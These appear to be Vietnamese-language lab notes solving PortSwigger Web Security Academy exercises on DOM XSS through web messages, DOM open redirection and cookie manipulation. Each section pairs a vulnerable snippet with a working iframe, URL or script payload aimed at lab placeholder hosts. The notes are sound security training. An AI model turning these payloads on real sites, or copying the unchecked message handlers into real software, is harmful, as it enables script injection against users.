### DOM XSS using web messages
```js
window.addEventListener('message', function(e) {
  eval(e.data);   // <- sink nguy hiểm, không kiểm tra origin -> vulnerable
});

Payload: 
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```
### DOM XSS using web messages and a JavaScript URL
```js
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```
Payload:
```js
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

Chuỗi `javascript:print()//http:` chứa `http:` → `indexOf('http:') !== -1` trả true → code tưởng đó là URL http → gán `location.href = msg` → trình duyệt xử lý `javascript:print()` → payload chạy.

### Lab: DOM XSS using web messages and `JSON.parse`
```js
window.addEventListener('message', function (e) {
    var iframe = document.createElement('iframe'), ACMEplayer = { element: iframe }, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch (e) {
        return;
    }
    switch (d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
```

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

Khi `iframe` chúng ta tạo được tải, phương thức `postMessage()` gửi một web message tới trang chủ với type là `load-channel`. Event listener nhận message và phân tích nó bằng `JSON.parse()` trước khi chuyển vào `switch`.

`switch` kích hoạt nhánh `load-channel`, nhánh này gán thuộc tính `url` của message cho thuộc tính src của `iframe` ACMEplayer.element. Tuy nhiên, trong trường hợp này, thuộc tính url của message thực sự chứa payload JavaScript của chúng ta.

Vì đối số thứ hai (targetOrigin) cho biết bất kỳ `targetOrigin` nào đều được phép cho web message, và handler không chứa bất kỳ hình thức kiểm tra origin nào, payload được đặt làm `src` của `iframe` `ACMEplayer.element`. Hàm `print()` được gọi khi nạn nhân tải trang trong trình duyệt của họ.

### DOM-based open redirection
```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```
- `(https?:\/\/.+)` là một capture group:
- `https?://` → bắt `http://` hoặc `https://`
- `.+` → khớp mọi ký tự từ đây đến hết chuỗi, càng nhiều càng tốt (gọi là tham lam - greedy).
- `.exec(location)` chạy regex trên chuỗi location (thường tự động chuyển thành `location.href`).
```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```

### DOM-based cookie manipulation
```js
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

```html
<iframe
  src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>"
  onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
</iframe>
```

